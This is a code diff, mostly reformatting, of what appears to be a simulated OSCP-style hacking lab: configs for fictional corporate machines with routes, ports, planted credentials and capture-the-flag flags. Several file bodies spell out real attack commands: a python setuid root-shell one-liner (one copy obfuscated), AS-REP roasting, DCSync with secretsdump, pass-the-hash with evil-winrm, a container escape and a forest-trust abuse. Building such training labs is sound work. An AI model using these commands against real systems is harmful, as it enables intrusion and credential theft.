@@ -83,14 +83,20 @@ phantom-api commit history:
           web: {
             server: "nginx/1.20.1",
             routes: {
-              "/": { status: 200, body: "<html><body><h1>Phantom Corp</h1><p>Enterprise Solutions</p><!-- api docs: /api/v1/docs --></body></html>" },
-              "/api/v1/docs": { status: 200, body: '{"endpoints":["/api/v1/status","/api/v1/mgmt (auth required)"],"auth":"X-API-Key header"}' },
+              "/": {
+                status: 200,
+                body: "<html><body><h1>Phantom Corp</h1><p>Enterprise Solutions</p><!-- api docs: /api/v1/docs --></body></html>",
+              },
+              "/api/v1/docs": {
+                status: 200,
+                body: '{"endpoints":["/api/v1/status","/api/v1/mgmt (auth required)"],"auth":"X-API-Key header"}',
+              },
               "/api/v1/status": { status: 200, body: '{"status":"operational","version":"2.1.4"}' },
               "/mgmt": { status: 401, body: '{"error":"X-API-Key header required"}' },
               "/mgmt/exec": {
                 status: 200,
                 protected: true,
-                body: '{"result":"RCE as www-data. SUID: /usr/bin/python3.10 (cap_setuid). python3 -c \\"import os;os.setuid(0);os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))\\""}'
+                body: '{"result":"RCE as www-data. SUID: /usr/bin/python3.10 (cap_setuid). python3 -c \\"import os;os.setuid(0);os.system(chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104))\\""}',
               },
             },
             discoverablePaths: ["/api/v1/docs", "/api/v1/status", "/mgmt", "/mgmt/exec"],
@@ -98,7 +104,8 @@ phantom-api commit history:
           fs: {
             "/home/www-data/local.txt": "CYBERAI{ph4nt0m_us3r_fl4g}",
             "/root/root.txt": "CYBERAI{ph4nt0m_g1t_l34k_t0_r00t}",
-            "/usr/bin/python3.10": "[cap_setuid+ep capability — GTFOBins: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")']",
+            "/usr/bin/python3.10":
+              "[cap_setuid+ep capability — GTFOBins: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")']",
           },
           rootFlagPath: "/root/root.txt",
         },
@@ -176,18 +183,33 @@ OSCP exam condition: 3 flags (user + user + root) = 70 points.`,
             server: "nginx/1.18.0",
             routes: {
               "/": { status: 200, body: "<html><body><h1>Blacksite Corp</h1></body></html>" },
-              "/robots.txt": { status: 200, body: "User-agent: *\nDisallow: /deploy/\nDisallow: /.git/" },
-              "/.git/config": { status: 200, body: "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:blacksite-corp/web-deploy" },
+              "/robots.txt": {
+                status: 200,
+                body: "User-agent: *\nDisallow: /deploy/\nDisallow: /.git/",
+              },
+              "/.git/config": {
+                status: 200,
+                body: '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = git@github.com:blacksite-corp/web-deploy',
+              },
               "/.git/COMMIT_EDITMSG": { status: 200, body: "fix: remove .env from repo (oops)" },
-              "/deploy/.env": { status: 200, body: "APP_SECRET=bls_sk_7f3a9c2e1d\nDB_PASS=Bl@ckDB2024\nSSH_USER=deploy\nSSH_PASS=D3pl0y#Secure" },
+              "/deploy/.env": {
+                status: 200,
+                body: "APP_SECRET=bls_sk_7f3a9c2e1d\nDB_PASS=Bl@ckDB2024\nSSH_USER=deploy\nSSH_PASS=D3pl0y#Secure",
+              },
               "/deploy/": { status: 403, body: "Forbidden" },
             },
-            discoverablePaths: ["/.git/config", "/.git/COMMIT_EDITMSG", "/deploy/.env", "/robots.txt"],
+            discoverablePaths: [
+              "/.git/config",
+              "/.git/COMMIT_EDITMSG",
+              "/deploy/.env",
+              "/robots.txt",
+            ],
           },
           credentials: [{ service: "ssh", username: "deploy", password: "D3pl0y#Secure" }],
           fs: {
             "/home/deploy/user.txt": "CYBERAI{bl4cks1t3_d3pl0y_us3r}",
-            "/home/deploy/network.txt": "eth0: 10.10.40.10\neth1: 10.10.41.5 (internal)\nInternal: 10.10.41.10 (FILE01), 10.10.41.20 (DC01)\nSMB creds on file server: shares/IT/",
+            "/home/deploy/network.txt":
+              "eth0: 10.10.40.10\neth1: 10.10.41.5 (internal)\nInternal: 10.10.41.10 (FILE01), 10.10.41.20 (DC01)\nSMB creds on file server: shares/IT/",
           },
         },
         {
@@ -199,11 +221,10 @@ OSCP exam condition: 3 flags (user + user + root) = 70 points.`,
             { port: 445, service: "microsoft-ds", state: "open" },
             { port: 5985, service: "winrm", state: "open" },
           ],
-          credentials: [
-            { service: "smb", username: "j.morrison", password: "M0rrison#2024" },
-          ],
+          credentials: [{ service: "smb", username: "j.morrison", password: "M0rrison#2024" }],
           fs: {
-            "//IT/admin_creds.txt": "Domain Admin backup:\nAdministrator : Bl@ckS1te$Admin\nDC: 10.10.41.20 (WinRM 5985)",
+            "//IT/admin_creds.txt":
+              "Domain Admin backup:\nAdministrator : Bl@ckS1te$Admin\nDC: 10.10.41.20 (WinRM 5985)",
             "//IT/user.txt": "CYBERAI{bl4cks1t3_f1l3_s3rv3r}",
             "//Public/welcome.txt": "Blacksite File Server. IT share: j.morrison / M0rrison#2024",
           },
@@ -299,13 +320,24 @@ to understand and apply it.`,
           os: "Linux (Ubuntu 20.04, kernel 5.4.0-150)",
           ports: [
             { port: 22, service: "ssh", version: "OpenSSH 8.2p1", state: "open" },
-            { port: 80, service: "http", version: "Apache 2.4.41 / Specter CMS 4.2.1", state: "open" },
+            {
+              port: 80,
+              service: "http",
+              version: "Apache 2.4.41 / Specter CMS 4.2.1",
+              state: "open",
+            },
           ],
           web: {
             server: "Apache/2.4.41",
             routes: {
-              "/": { status: 200, body: "<html><body><h1>Specter Industries</h1><!-- Powered by Specter CMS v4.2.1 --></body></html>" },
-              "/admin": { status: 200, body: "<html><body><h1>Specter CMS Admin</h1><p>Default: admin/specter123</p></body></html>" },
+              "/": {
+                status: 200,
+                body: "<html><body><h1>Specter Industries</h1><!-- Powered by Specter CMS v4.2.1 --></body></html>",
+              },
+              "/admin": {
+                status: 200,
+                body: "<html><body><h1>Specter CMS Admin</h1><p>Default: admin/specter123</p></body></html>",
+              },
               "/admin/plugin-upload": {
                 status: 200,
                 protected: true,
@@ -416,8 +448,10 @@ This is at the OSCP Advanced AD module level.`,
             { service: "smb", username: "Administrator", password: "__NTLM_HASH__" },
           ],
           fs: {
-            "AS-REP-info": "GetNPUsers.py IRONVAULT.LOCAL/ -usersfile users.txt -dc-ip 10.10.40.30 → svc_backup hash → hashcat -m 18200 → 'Backup@2023!'",
-            "DCSync-info": "svc_sync has DS-Replication-Get-Changes-All ACL. secretsdump.py IRONVAULT/svc_sync:Sync$ecure99@10.10.40.30 → Administrator:aad3b435...:8f49412c3a8e...",
+            "AS-REP-info":
+              "GetNPUsers.py IRONVAULT.LOCAL/ -usersfile users.txt -dc-ip 10.10.40.30 → svc_backup hash → hashcat -m 18200 → 'Backup@2023!'",
+            "DCSync-info":
+              "svc_sync has DS-Replication-Get-Changes-All ACL. secretsdump.py IRONVAULT/svc_sync:Sync$ecure99@10.10.40.30 → Administrator:aad3b435...:8f49412c3a8e...",
             "PTH-info": "evil-winrm -i 10.10.40.30 -u Administrator -H 8f49412c3a8e... → DC shell",
             "C:/Users/Administrator/Desktop/root.txt": "CYBERAI{1r0nv4ult_dcs_ync_g0ld3n}",
             "C:/Users/svc_backup/Desktop/user.txt": "CYBERAI{1r0nv4ult_4sr3p_us3r}",
@@ -540,23 +574,33 @@ quickly identify rabbit holes and focus on the real path.`,
           ports: [
             { port: 22, service: "ssh", version: "OpenSSH 8.9p1", state: "open" },
             { port: 80, service: "http", version: "nginx", state: "open" },
-            { port: 5000, service: "docker-registry", version: "Docker Registry v2", state: "open" },
+            {
+              port: 5000,
+              service: "docker-registry",
+              version: "Docker Registry v2",
+              state: "open",
+            },
             { port: 8443, service: "https-alt", version: "nginx (Coming Soon)", state: "open" },
           ],
           web: {
             server: "nginx",
             routes: {
               "/": { status: 200, body: "<html><body><h1>Nexus Corp</h1></body></html>" },
-              "/v2/": { status: 401, body: '{"errors":[{"code":"UNAUTHORIZED","message":"authentication required"}]}' },
+              "/v2/": {
+                status: 401,
+                body: '{"errors":[{"code":"UNAUTHORIZED","message":"authentication required"}]}',
+              },
               "/v2/nexus-app/manifests/latest": {
                 status: 200,
                 protected: true,
-                body: '[Docker image manifest. Pull with: docker pull registry.nexus.corp:5000/nexus-app:latest. Image contains /app/.env with APP_KEY=nxs_app_sk_3e7b and SSH_USER=appuser]',
+                body: "[Docker image manifest. Pull with: docker pull registry.nexus.corp:5000/nexus-app:latest. Image contains /app/.env with APP_KEY=nxs_app_sk_3e7b and SSH_USER=appuser]",
               },
             },
             discoverablePaths: ["/v2/", "/v2/nexus-app/manifests/latest"],
           },
-          credentials: [{ service: "ftp", username: "ci_deploy", password: "nxs_reg_7f2a9c4e1b8d3f6a" }],
+          credentials: [
+            { service: "ftp", username: "ci_deploy", password: "nxs_reg_7f2a9c4e1b8d3f6a" },
+          ],
           fs: {
             "/root/user.txt": "CYBERAI{n3xus_r3g1stry_us3r}",
             "/dev/sda1": "[HOST DISK — privileged container escape: mount /dev/sda1 /mnt]",
@@ -566,13 +610,12 @@ quickly identify rabbit holes and focus on the real path.`,
           ip: "10.10.42.10",
           hostname: "app.nexus.local",
           os: "Linux (Debian 11)",
-          ports: [
-            { port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" },
-          ],
+          ports: [{ port: 22, service: "ssh", version: "OpenSSH 8.4p1", state: "open" }],
           credentials: [{ service: "ssh", username: "appuser", password: "nxs_app_sk_3e7b" }],
           fs: {
             "/home/appuser/user.txt": "CYBERAI{n3xus_4pp_s3rv3r_us3r}",
-            "/home/appuser/internal_notes.txt": "Windows: 10.10.42.20 svc_nexus:Nxs$2024\nDC: 10.10.42.30 NEXUS.LOCAL\nForest trust: PARTNER.LOCAL (10.10.42.40) — SID filtering disabled!",
+            "/home/appuser/internal_notes.txt":
+              "Windows: 10.10.42.20 svc_nexus:Nxs$2024\nDC: 10.10.42.30 NEXUS.LOCAL\nForest trust: PARTNER.LOCAL (10.10.42.40) — SID filtering disabled!",
           },
         },
         {
@@ -602,7 +645,8 @@ quickly identify rabbit holes and focus on the real path.`,
           credentials: [{ service: "smb", username: "nexus_admin", password: "N3xus@dm1n2024" }],
           fs: {
             "C:/Users/Administrator/Desktop/root.txt": "CYBERAI{n3xus_dc_0wn3d}",
-            "C:/forest_trust.txt": "Forest trust: NEXUS.LOCAL ↔ PARTNER.LOCAL\nSID filtering: DISABLED\nPartner DC: 10.10.42.40\nTrust abuse: ExtraSids attack → PARTNER\\Administrator",
+            "C:/forest_trust.txt":
+              "Forest trust: NEXUS.LOCAL ↔ PARTNER.LOCAL\nSID filtering: DISABLED\nPartner DC: 10.10.42.40\nTrust abuse: ExtraSids attack → PARTNER\\Administrator",
           },
         },
         {
@@ -615,10 +659,13 @@ quickly identify rabbit holes and focus on the real path.`,
             { port: 445, service: "microsoft-ds", state: "open" },
             { port: 5985, service: "winrm", state: "open" },
           ],
-          credentials: [{ service: "smb", username: "Administrator", password: "__FOREST_TRUST_TICKET__" }],
+          credentials: [
+            { service: "smb", username: "Administrator", password: "__FOREST_TRUST_TICKET__" },
+          ],
           fs: {
             "C:/Users/Administrator/Desktop/nexus_final.txt": "CYBERAI{n3xus_f0r3st_tr4ns1t_0wn3d}",
-            "C:/Users/Administrator/Desktop/proof.txt": "OSCP ELITE — NEXUS FINAL EXAM SUCCESSFULLY COMPLETED.\nYou are ready for the real OSCP certification, operator.",
+            "C:/Users/Administrator/Desktop/proof.txt":
+              "OSCP ELITE — NEXUS FINAL EXAM SUCCESSFULLY COMPLETED.\nYou are ready for the real OSCP certification, operator.",
           },
         },
       ],
